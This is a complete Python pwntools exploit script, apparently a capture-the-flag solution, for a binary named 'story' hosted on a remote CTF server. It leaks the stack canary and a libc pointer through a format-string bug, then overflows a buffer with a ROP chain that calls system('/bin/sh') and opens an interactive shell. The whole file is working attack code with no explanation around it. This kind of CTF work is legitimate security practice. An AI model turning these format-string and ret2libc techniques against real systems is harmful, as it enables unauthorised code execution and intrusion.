#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.binary = "./story"
context.log_level = "debug"

# io = process("./story", env = {"LD_PRELOAD": "./libc6_2.23-0ubuntu10_amd64.so"})
io = remote("ctf2.linkedbyx.com", 10625)
libc = ELF("./libc6_2.23-0ubuntu10_amd64.so", checksec = False)

io.sendlineafter("ID:", "..%15$p..%12$p..")
io.recvuntil("..")
canary = int(io.recvuntil("..", drop = True), 16)
success("canary -> {:#x}".format(canary))
stdout = int(io.recvuntil("..", drop = True), 16)
success("stdout -> {:#x}".format(stdout))
libc.address = stdout - libc.sym['_IO_2_1_stdout_']
success("libc -> {:#x}".format(libc.address))

raw_input("DEBUG: ")
io.sendlineafter("story:\n", "200")

# io.sendlineafter("story:\n", cyclic(n = 8, length = 500))
payload = 'a' * 136 + 2 * p64(canary) + flat(libc.address + 0x0000000000021102, next(libc.search("/bin/sh")), libc.sym['system'])
io.sendlineafter("story:\n", payload)


io.interactive()
